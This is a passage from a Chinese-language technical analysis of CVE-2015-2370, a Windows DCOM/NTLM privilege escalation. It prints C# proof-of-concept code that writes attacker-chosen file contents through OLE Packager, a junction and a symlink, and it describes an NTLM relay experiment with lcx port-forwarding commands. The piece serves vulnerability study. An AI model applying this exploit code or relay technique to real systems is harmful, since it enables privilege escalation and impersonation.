
服务器在收到客户端的协商消息之后，在Negotiate Flags写入出自己所能接受的加密等级,并生成一个随机数`challenge`返回给客户端.这个`challenge`实际上也可以被重放,由接受另一个Authenticate来认证,实现身份窃取,笔者会在接下去的实验中认证.如果`Type2` 消息的`reserved`字段不为`0`,为本机内部认证,可以在<a href="elink@36aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1M7X3g2W2L8X3#2S2j5$3S2A6L8X3g2Q4x3V1k6d9L8%4c8@1k6h3&6b7L8%4c8S2N6r3!0z5c8H3`.`.">RottenPotato</a>类似的方式使用<a href="elink@45fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6V1k6i4y4C8N6r3!0H3i4K6u0r3f1$3g2U0b7i4g2@1K9p5&6Q4x3V1k6S2N6i4c8Z5k6h3&6@1K9h3y4S2N6r3W2G2L8W2)9J5k6r3k6#2L8X3y4@1K9h3!0F1M7H3`.`.">SSPI</a>中的函数获取SecurityContext,有兴趣的读者可以研究下.

### (3). Type3 消息: Authenticate激活消息。

客户端在收到服务端发回的Challenge消息之后,读取了服务端的随机数`challenge`。使用自己的客户端身份信息以及服务器的随机数`challenge`通过复杂的运算,生成一个客户端随机数`challenge`和客户端的在Negotiate Flags,如果包含签名这会把整个Authenticate认证消息加入运算,导致身份窃取替换无效,如无签名可以替换,详细看实验证明。Authenticate认证消息发送之后客户端会在服务器端返回之前接着发送`ResolveOxid2`(`IObjectExporter`模式)或`RemoteCreateInstance`(`IRemoteSCMActivator`模式)给服务器端,告诉服务器端最终需要解析的请求.

### (4). 服务器在收到 Type3的消息之后,处理请求后会返回激活成功或失败消息,至此dcom远程激活完成

![](upload/attach/201907/609565\_4TA8FDFEQWFMSSW.png)

#### 3.任意文件创建过程

从数据包分析`IRemoteSCMActivator::RemoteCreateInstance`主要是其中`pActProperties`结构其中包含这几个常见字段

![](upload/attach/201907/609565\_2J6CVSDE3A4MQUA.png)

详细解释可以参考<a href="elink@75eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7$3c8F1i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8X3I4A6j5Y4u0S2M7Y4W2Q4x3V1k6U0j5K6t1J5y4U0V1$3y4g2)9J5k6h3q4K6M7s2R3`.">官方文档</a>,其中`InstanceInfoData`的`InstantiatedObjectClsId`是表示要创建com实例的OLE Packager的`clsid`: `{F20DA720-C02F-11CE-927B-0800095AE340}`,由于wireshark错位的原因以二进制中的数据为准![](upload/attach/201907/609565\_8ESCX84KXJ9799D.png)

OLE Packager是一个ActiveX控件的包格式,会将自身在`pActProperties`其中的`InstanceInfoData`字段的`ifdStg`的marshal结构中的二进制数据写入`C:\Users\<username>\AppData\Local\Temp\(2)`的文件中当被创建时

```
typedef struct tagInstanceInfoData {
[string] wchar_t* fileName;
DWORD mode;
MInterfacePointer* ifdROT;
MInterfacePointer* ifdStg;
} InstanceInfoData;
```

![](upload/attach/201907/609565\_BFE9CFQB9N6P384.png)

这个`ifdStg`也是一个OBJREF结构,它通过一个ObjrefMoniker将这个OLE Packager对象转换而成,`CreateObjrefMoniker`是一个将com对象marshal后转换成一个moniker可以在`ObjrefMoniker::GetDisplayName`函数中获取Base64Encoded的OBJREF二进制数据的函数。poc中读取源文件的二进制数据`filedata`是最终要创建高权限文件的内容写入OLE Packager,导致在OLE Packager的unmarshal后位于`C:\Users\<username>\AppData\Local\Temp\`创建一个文件名为`(2)`的文件内容为`filedata`,通过创建CreateJunction给temp和`C:\\users\\public\\libraries\\Sym`文件夹使`(2)`的文件也会在Sym里创建,同时创建CreateSymlink给Sym文件夹的`(2)`文件和最终要写入的任意文件路径,导致`(2)`中的`filedata`二进制写入目标文件,最终实现`RemoteCreateInstance`被服务器端解析后以高权限进程写入任意文件

```
public const string CLSID_Package = "f20da720-c02f-11ce-927b-0800095ae340";
public static IStorage CreatePackageStorage(string name, byte[] filedata)
{
//将源文件的二进制数据filedata写入OLE Packager
MemoryStream ms = new MemoryStream(PackageBuilder.BuildPackage(name, filedata));
IStorage stg = CreateStorage("dump.stg");
ComUtils.OLESTREAM stm = new ComUtils.OLESTREAM();
stm.GetMethod = (a, b, c) =>
{
//Console.WriteLine("{0} {1} {2}", a, b, c);
byte[] data = new byte[c];
int len = ms.Read(data, 0, (int)c);
Marshal.Copy(data, 0, b, len);
return (uint)len;
};
OleConvertOLESTREAMToIStorage(ref stm, stg, IntPtr.Zero);
//写入OLE Packager的clasid
Guid g = new Guid(CLSID_Package);
stg.SetClass(ref g);
return stg;
}
//通过ObjrefMoniker创建二进制OBJREF填充ifdStg
public static byte[] GetMarshalledObject(object o)
{
IMoniker mk;
CreateObjrefMoniker(Marshal.GetIUnknownForObject(o), out mk);
IBindCtx bc;
CreateBindCtx(0, out bc);
string name;
mk.GetDisplayName(bc, null, out name);
return Convert.FromBase64String(name.Substring(7).TrimEnd(':'));
}
[MTAThread]
static void DoRpcTest(object o, ref RpcContextSplit ctx, string rock, string castle)
{
ManualResetEvent ev = (ManualResetEvent)o;
TcpListener listener = new TcpListener(IPAddress.Loopback, DUMMY_LOCAL_PORT);
byte[] rockBytes = null;
//读取源文件的二进制数据filedata写入OLE Packager
try { rockBytes = File.ReadAllBytes(rock); }
catch
{
Console.WriteLine("[!] Error reading initial file!");
Environment.Exit(1);
}
Console.WriteLine(String.Format("[+] Loaded in {0} bytes.", rockBytes.Length));
bool is64bit = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
try
{
Console.WriteLine("[+] Getting out our toolbox...");
if (is64bit)
{
File.WriteAllBytes("C:\\users\\public\\libraries\\createsymlink.exe", Trebuchet.Properties.Resources.CreateSymlinkx64);
}
else
{
File.WriteAllBytes("C:\\users\\public\\libraries\\createsymlink.exe", Trebuchet.Properties.Resources.CreateSymlinkx86);
}
}
catch
{
Console.WriteLine("[!] Error writing to C:\\users\\public\\libraries\\createsymlink.exe!");
Environment.Exit(1);
}
string name = GenRandomName();
string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
string tempPath = Path.Combine(windir, "temp", name);
//Sym文件夹使(2)的文件也会在Sym里创建
if (!CreateJunction(tempPath, "\"C:\\users\\public\\libraries\\Sym\\"))
{
Console.WriteLine("[!] Couldn't create the junction");
Environment.Exit(1);
}
//Sym文件夹使(2)中的filedata二进制写入目标文件castle
if (CreateSymlink("C:\\users\\public\\libraries\\Sym\\ (2)", castle)) //Exit bool is inverted!
{
Console.WriteLine("[!] Couldn't create the SymLink!");
Environment.Exit(1);
}
IStorage stg = ComUtils.CreatePackageStorage(name, rockBytes);
byte[] objref = ComUtils.GetMarshalledObject(stg);
.....
}
```

## 复现小实验

#### 1.实验环境

操作系统：Windows Server 20008 R2

开发环境: vs2013

#### 2.实验设计

我设计了一个实验来演示ntlm数据包重放现象,<a href="elink@025K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3y4T1N6$3q4F1k6K6f1H3y4g2)9J5c8X3&6@1L8r3@1`.">git地址</a>

我创建了2个用户alice和bob,分别以alice和bob身份`CoCreateInstanceEx`创建一个com对象。然后把这2个创建过程的数据包通过2个lcx服务器(`192.168.0.6=>proxy1`和`192.168.0.12->proxy2`)的135端口中转至本机135端口,通过以下lcx命令:

在`192.168.0.6`和`192.168.0.12`上分别执行

`lcx -listen 1234 135`

在本机上执行

`lcx -slave 192.168.0.6 1234 127.0.0.1 2222`

`lcx -slave 192.168.0.12 1234 127.0.0.1 6666`

过程如下图:

![](upload/attach/201907/609565\_F66JN2C4X5U7YSV.png)

在这个进程中把把rpcss服务给alice的ntlm认证tyep2 Challenge激活消息转发给接收bob,alice绑定的rpcss服务接收bob的tyep3 Authenticate消息的,把rpcss服务给bob的tyep2 Challenge转发给alice,bob绑定rpcss服务接收alice的tyep3 Authenticate消息的,由于ntlm机制的原因Challenge和Authenticate消息都是本机的激活消息,Authenticate消息也没有给自己添加签名(`IRemoteSCMActivator`模式),我们看数据包分析

![](upload/attach/201907/609565\_RZ2AA4KV8KXSXKB.png)

结果都返回了`RemoteCreateInstance`成功的返回消息

接下来我们把alice的身份换成了一个不存在的用户alice1,也以同样的方式转发tyep2 Challenge和tyep3 Authenticate消息,实验的结果是这个不存在的alice1用户反而被bob成功创建`CoCreateInstanceEx`了com对象,反过来说原本应该成功的bob被alice1的身份替换了反而创建失败

![](upload/attach/201907/609565\_4Y7MVHCAYSM8AHC.png)

![](upload/attach/201907/609565\_F76ACF2ZB7DQV3A.png)

#### 3.实验结论

既然alice和bob的消息可以通过替换身份信息创建com对象,那么以CVE-2015-2370中采用`CoGetInstanceFromIStorage`方式以system权限的`IObjectExporter`中的ntlm认证消息能以这样方式重放吗,答案是不行的,因为`IObjectExporter`的tyep3 Authenticate包含对`IObjectExporter`的签名,rpcss服务还是会对`RemoteCreateInstance`请求返回拒绝访问,但是CVE-2015-2370方式是可以的因为之前替换了`IOXIDResolver`了`ISystemActivator`的激活方式,tyep3 Authenticate消息仍然保持之前对消息签名而且数据包没中转,`RemoteCreateInstance`请求仍是签名过的,所以最后会成功。另外提一点`IObjectExporter`的签名等级高于`IRemoteSCMActivator`,如果有中转`IObjectExporter`到`IRemoteSCMActivator`是不行的,但是`IRemoteSCMActivator`到`IObjectExporter`是可以的,但是`IObjectExporter`创建不了com对象,所以没法实现提权。如果读者有兴趣可自行尝试

>引用

[CVE-2015-2370官方链接](<mark class="encrypted">b79K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1N6h3N6K6i4K6u0W2j5$3S2J5L8$3#2A6N6h3#2Q4x3X3g2G2M7X3N6Q4x3V1k6H3i4K6u0r3M7s2u0G2K9X3g2U0N6q4)9J5k6s2A6W2M7X3!0Q4x3V1k6A6M7%4y4#2k6i4y4Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3@1k6A6k6q4)9K6c8o6x3J5y4g2)9J5y4X3y4S2L8W2)9K6c8o6q4Q4x3U0k6I4i4K6y4p5k6r3y4G2L8g2)9J5y4X3y4G2L8s2y4H3k6h3y4Q4x3@1c8u0c8q4)9J5y4e0t1H3f1%4c8S2N6s2g2K6i4K6t1#2x3U0m8d9k6i4y4@1M7X3W2U0N6q4)9J5y4e0t1H3f1X3g2H3L8%4u0@1k6h3c8Q4x3U0f1J5x3q4k6W2L8X3c8G2M7W2)9J5y4e0t1H3f1s2u0G2k6s2g2U0N6q4)9J5y4e0t1H3c8X3W2F1k6r3g2J5i4K6t1#2x3U0m8e0N6h3#2E0j5i4u0&6</mark> "project-zero")
